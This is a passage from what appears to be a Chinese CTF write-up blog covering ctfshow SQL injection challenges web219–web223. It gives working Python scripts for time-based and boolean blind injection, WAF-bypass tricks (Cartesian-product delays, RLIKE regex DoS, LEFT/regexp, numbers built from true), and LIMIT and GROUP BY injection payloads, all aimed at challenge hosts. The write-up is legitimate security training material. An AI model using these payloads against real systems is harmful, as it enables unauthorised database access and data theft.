</span></span><span class="line"><span class="ln">37</span><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;An unexpected error occurred: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">
</span></span><span class="line"><span class="ln">40</span><span class="cl">    <span class="k">if</span> <span class="n">head</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">        <span class="c1"># 如果找到有效的字符，将其添加到结果字符串中</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">        <span class="c1"># 如果没有找到有效字符，退出循环</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl">
</span></span><span class="line"><span class="ln">47</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*]Result : &#34;</span><span class="o">+</span><span class="n">result</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">48</span><span class="cl">
</span></span><span class="line"><span class="ln">49</span><span class="cl"><span class="c1"># ctfshow{d317911f-ac1e-4160-be70-47d01a0f2f45}</span>
</span></span></code></pre></div><p>乱码的话，多跑几次就好了</p>
<p>另一种方法就是通过正则 DOS RLIKE注入</p>
<p>利用 SQL 多次计算正则消耗计算资源产生延时效果，与 benchmark 原理类似，通过 rpad 或 repeat 构造长字符串，以计算量大的 pattern。</p>
<pre tabindex="0"><code>debug=1&amp;ip=repeat(rpad(&#39;a&#39;, 999999, &#39;a&#39;),16) rlike concat(repeat(&#39;(a.*)+&#39;,14), &#39;b&#39;)
</code></pre><h4 id="web219">web219<a hidden class="anchor" aria-hidden="true" href="#web219">#</a></h4>
<pre tabindex="0"><code>查询语句

       where id = ($id);
      
返回逻辑

    //屏蔽危险分子
    function waf($str){
        return preg_match(&#39;/sleep|benchmark|rlike/i&#39;,$str);
    }   
      
</code></pre><p>继续使用笛卡尔积盲注即可</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://61d55d79-847e-43d7-80e4-c221ceae9f4a.challenge.ctf.show/api/&#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="c1"># ASCII码范围，32到127是可打印字符的范围</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="c1"># 二分查找的中间值</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="c1"># payload = &#34;select table_name from information_schema.tables where table_schema=database() limit 0,1&#34;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="c1"># payload = &#34;select column_name from information_schema.columns where table_name=&#39;ctfshow_flagxca&#39; limit 1,1&#34;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;select flagaabc from ctfshow_flagxca&#34;</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="s1">&#39;ip&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;1) or if(ascii(substr((</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">,(select count(*) from information_schema.columns A, information_schema.columns B),1)#&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="s1">&#39;debug&#39;</span><span class="p">:</span> <span class="s1">&#39;1&#39;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">            <span class="c1"># 发送POST请求，设置超时时间为1秒</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.15</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">            <span class="c1"># 如果请求在1秒内返回，说明当前位置字符的ASCII码小于等于中间值</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">            <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">        <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">Timeout</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">            <span class="c1"># 如果请求超时，说明当前位置字符的ASCII码大于中间值</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">            <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;An unexpected error occurred: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">
</span></span><span class="line"><span class="ln">41</span><span class="cl">    <span class="k">if</span> <span class="n">head</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">        <span class="c1"># 如果找到有效的字符，将其添加到结果字符串中</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl">        <span class="c1"># 如果没有找到有效字符，退出循环</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl">
</span></span><span class="line"><span class="ln">48</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*]Result : &#34;</span><span class="o">+</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></div><h4 id="web220">web220<a hidden class="anchor" aria-hidden="true" href="#web220">#</a></h4>
<pre tabindex="0"><code>查询语句

       where id = ($id);
      
返回逻辑

    //屏蔽危险分子
    function waf($str){
        return preg_match(&#39;/sleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr/i&#39;,$str);
    }   
      
</code></pre><p>substr用left代替即可，有点像之前布尔盲注的一道题，只是改成了时间盲注罢了</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://52728b9a-ffae-4f96-b51f-0549bb5cb4e0.challenge.ctf.show/api/&#34;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nb">str</span><span class="o">=</span><span class="s2">&#34; _</span><span class="si">{}</span><span class="s2">-&#34;</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">45</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">        <span class="c1"># payload = &#34;select table_name from information_schema.tables where table_schema=database() limit 0,1&#34;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">        <span class="c1"># payload = &#34;select column_name from information_schema.columns where table_name=&#39;ctfshow_flagxcac&#39; limit 1,1&#34;</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;select flagaabcc from ctfshow_flagxcac&#34;</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">            <span class="s1">&#39;ip&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;1) or if(LEFT((</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">)regexp(&#39;</span><span class="si">{</span><span class="n">result</span><span class="o">+</span><span class="n">j</span><span class="si">}</span><span class="s2">&#39;),(select count(*) from information_schema.columns A, information_schema.columns B),1)#&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">            <span class="s1">&#39;debug&#39;</span><span class="p">:</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.15</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="n">result</span> <span class="o">=</span> <span class="n">result</span> <span class="o">+</span> <span class="n">j</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] loading :&#34;</span><span class="o">+</span><span class="n">result</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] result :&#34;</span><span class="o">+</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></div><h4 id="web221">web221<a hidden class="anchor" aria-hidden="true" href="#web221">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">查询语句</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl">  <span class="c1">//分页查询
</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="nx">select</span> <span class="o">*</span> <span class="nx">from</span> <span class="nx">ctfshow_user</span> <span class="nx">limit</span> <span class="p">(</span><span class="nv">$page</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="nv">$limit</span><span class="p">,</span><span class="nv">$limit</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">      
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">
</span></span><span class="line"><span class="ln">8</span><span class="cl"><span class="c1">//TODO:很安全，不需要过滤
</span></span></span><span class="line"><span class="ln">9</span><span class="cl"><span class="c1">//拿到数据库名字就算你赢
</span></span></span></code></pre></div><p>p神的文章有提到limit注入</p>
<p><a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html">[转载]Mysql下Limit注入方法 | 离别歌</a></p>
<p><img alt="image-20250214215951430" loading="lazy" src="./assets/image-20250214215951430.png"></p>
<p>payload:</p>
<pre tabindex="0"><code>?page=1&amp;limit=1%20procedure%20analyse(extractvalue(rand(),concat(0x3a,database())),1)
</code></pre><p><img alt="image-20250214220519994" loading="lazy" src="./assets/image-20250214220519994.png"></p>
<h4 id="group注入">group注入<a hidden class="anchor" aria-hidden="true" href="#group注入">#</a></h4>
<h4 id="web222">web222<a hidden class="anchor" aria-hidden="true" href="#web222">#</a></h4>
<pre tabindex="0"><code>查询语句

  //分页查询
  $sql = select * from ctfshow_user group by $username;
      
返回逻辑

//TODO:很安全，不需要过滤
</code></pre><p><img alt="image-20250215150334370" loading="lazy" src="./assets/image-20250215150334370.png"></p>
<p>group by 可以进行时间盲注，布尔盲注等</p>
<p>本来以为是报错注入的，发现好像不太行</p>
<p>还是的时间盲注</p>
<p>拿前面的盲注脚本改一改</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://529d9311-c036-4831-bfa1-b2ca91dae190.challenge.ctf.show/api/?u=&#34;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="c1"># ASCII码范围，32到127是可打印字符的范围</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="c1"># 二分查找的中间值</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="c1"># 查表名</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(table_name) from information_schema.tables where table_schema=database()&#34;</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="c1"># 查列名字</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="c1"># payload = &#34;select column_name from information_schema.columns where table_name=&#39;ctfshow_flaga&#39; limit 1,1&#34;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="c1"># 爆字段</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;select flagaabc from ctfshow_flaga&#34;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;concat((if (ascii(substr((</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">, sleep(0.05), 2)), 1);&#34;</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="n">data</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.05</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">            <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">        <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">Timeout</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">            <span class="c1"># 如果请求超时，说明当前位置字符的ASCII码大于中间值</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">            <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;An unexpected error occurred: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">
</span></span><span class="line"><span class="ln">38</span><span class="cl">    <span class="k">if</span> <span class="n">head</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">        <span class="c1"># 如果找到有效的字符，将其添加到结果字符串中</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">        <span class="c1"># 如果没有找到有效字符，退出循环</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*]Result : &#34;</span><span class="o">+</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></div><h4 id="web223">web223<a hidden class="anchor" aria-hidden="true" href="#web223">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">查询语句</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl">  <span class="c1">//分页查询
</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="nx">select</span> <span class="o">*</span> <span class="nx">from</span> <span class="nx">ctfshow_user</span> <span class="nx">group</span> <span class="nx">by</span> <span class="nv">$username</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">      
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">
</span></span><span class="line"><span class="ln">8</span><span class="cl"><span class="c1">//TODO:很安全，不需要过滤
</span></span></span><span class="line"><span class="ln">9</span><span class="cl"><span class="c1">//用户名不能是数字
</span></span></span></code></pre></div><p>这题ban掉了数字</p>
<p>用true来构造出数字即可</p>
<p>这题一开始我想用时间盲注的，但是跑不出来，后面直接拿y4✌的布尔盲注跑了</p>
<p>如下</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://14dc1900-f046-44e8-bfa2-e93fbc2a32b3.challenge.ctf.show/api/?u=&#34;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">def</span> <span class="nf">createNum</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="n">num</span> <span class="o">=</span> <span class="s1">&#39;true&#39;</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="k">if</span> <span class="n">n</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">        <span class="k">return</span> <span class="s1">&#39;true&#39;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span> <span class="o">-</span> <span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">            <span class="n">num</span> <span class="o">+=</span> <span class="s2">&#34;+true&#34;</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">return</span> <span class="n">num</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="c1"># ASCII码范围，32到127是可打印字符的范围</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="c1"># 二分查找的中间值</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="c1"># 查数据库-ctfshow_flagas</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(table_name) from information_schema.tables where table_schema=database()&#34;</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">        <span class="c1"># 查字段-flagasabc</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flagas&#39;&#34;</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">        <span class="c1"># 查flag</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;select flagasabc from ctfshow_flagas&#34;</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">
</span></span><span class="line"><span class="ln">33</span><span class="cl">
</span></span><span class="line"><span class="ln">34</span><span class="cl">        <span class="n">params</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">            <span class="c1"># &#34;u&#34;: f&#34;if(ascii(substr(({payload}),{createNum(i)},{createNum(1)}))&gt;{createNum(mid)},sleep(true),true)&#34;  #时间盲注 （我没跑出来，不知道为啥</span>
